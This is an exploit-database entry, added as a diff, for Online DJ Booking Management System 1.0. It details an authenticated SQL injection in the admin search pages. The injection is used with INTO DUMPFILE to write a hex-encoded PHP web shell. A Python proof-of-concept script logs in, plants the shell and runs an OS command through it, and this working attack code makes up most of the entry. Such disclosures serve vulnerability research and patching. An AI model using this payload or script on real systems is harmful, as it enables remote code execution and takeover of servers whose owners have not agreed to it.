@@ -1,0 +1,123 @@
+id: 34672
+date: 07/12/2020
+title: Online DJ Booking Management System Project Report 1.0 SQL Injection / Code Execution Vulnerabilitie
+author: gh1mau
+cves: 
+
+# Exploit Title: Online DJ Booking Management System Project Report - RCE Through SQLi (Authenticated User - admin)
+# Exploit Author: gh1mau
+# Team Members: Capt'N,muzzo,chaos689 | https://h0fclanmalaysia.wordpress.com/
+# Vendor Homepage: https://phpgurukul.com/online-dj-booking-management-system-using-php-and-mysql/
+# Software Link: https://phpgurukul.com/?smd_process_download=1&download_id=11402
+# Version: V1.0
+# Tested on: PHP 5.6.18, Apache/2.4.18 (Win32), Ver 14.14 Distrib 5.7.11, for Win32 (AMD64)
+
+Vulnerable File:
+---------------- 
+1) /admin/user-search.php
+2) /admin/booking-search.php
+
+
+Vulnerable Code:
+----------------
+
+1) /admin/user-search.php
+   line 58: $sdata=$_POST['searchdata'];
+
+2) /admin/booking-search.php
+   line 58: $sdata=$_POST['searchdata'];
+
+
+Vulnerable Issue:
+-----------------
+Both line 58: $sdata=$_POST['searchdata']; (/admin/user-search.php and /admin/booking-search.php ) has no proper sanitization
+
+POC:
+----
+[+] Inject the following payload inside the Search form
+
+-1' UNION ALL SELECT 0x3c3f7068702073797374656d28245f524551554553545b276768316d6175275d293b203f3e,NULL,NULL,NULL,NULL,NULL,NULL INTO DUMPFILE 'C:/UwAmp/www/odms/1.php'-- -
+
+
+Python Script POC:
+------------------
+
+import requests
+
+#this script is for POC purpose, you could add your own error checking mechanism
+
+username = "admin"
+password = "Test@123"
+webshellPayload = "0x3c3f7068702073797374656d28245f524551554553545b276768316d6175275d293b203f3e"
+path = "%27C%3A%2FUwAmp%2Fwww%2Fodms%2F1.php%27"
+command = "whoami"
+
+print("[+] Stage 1 : Login as admin")
+
+url1 = "http://localhost:80/odms/admin/login.php"
+
+payload1 = "username=" + username + "&password=" + password + "&login="
+headers1 = {
+    "Origin": "http://localhost", 
+    "Cookie": "PHPSESSID=arrhodq9mhfjsu1utb5j59s1k2", 
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", 
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0", 
+    "Connection": "close", 
+    "Referer": "http://localhost/odms/admin/login.php", 
+    "Host": "localhost", 
+    "Accept-Encoding": "gzip, deflate", 
+    "Upgrade-Insecure-Requests": "1", 
+    "Accept-Language": "en-US,en;q=0.5", 
+    "Content-Length": "41", 
+    "Content-Type": "application/x-www-form-urlencoded"
+}
+
+requests.request("POST", url1, data=payload1, headers=headers1)
+
+
+print("[+] Stage 2 : Injecting Web Shell")
+
+
+url2 = "http://localhost:80/odms/admin/user-search.php"
+
+payload2 = "searchdata=-1%27+UNION+ALL+SELECT+" + webshellPayload + "%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL+INTO+DUMPFILE+" + path + "--+-&search="
+headers2 = {
+    "Origin": "http://localhost", 
+    "Cookie": "PHPSESSID=arrhodq9mhfjsu1utb5j59s1k2", 
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", 
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0", 
+    "Connection": "close", 
+    "Referer": "http://localhost/odms/admin/user-search.php", 
+    "Host": "localhost", 
+    "Accept-Encoding": "gzip, deflate", 
+    "Upgrade-Insecure-Requests": "1", 
+    "Accept-Language": "en-US,en;q=0.5", 
+    "Content-Length": "46", 
+    "Content-Type": "application/x-www-form-urlencoded"
+}
+
+requests.request("POST", url2, data=payload2, headers=headers2)
+
+
+
+print("[+] Stage 3 : Run command\n")
+
+url3 = "http://localhost:80/odms/1.php?gh1mau=" + command
+
+payload3 = ""
+headers3 = {
+    "Cookie": "PHPSESSID=arrhodq9mhfjsu1utb5j59s1k2", 
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", 
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0", 
+    "Connection": "close", 
+    "Host": "localhost", 
+    "Accept-Encoding": "gzip, deflate", 
+    "Upgrade-Insecure-Requests": "1", 
+    "Accept-Language": "en-US,en;q=0.5"
+}
+
+response = requests.request("GET", url3, data=payload3, headers=headers3)
+
+print(response.text)
+
+#  0day.today [2023-03-25]  #
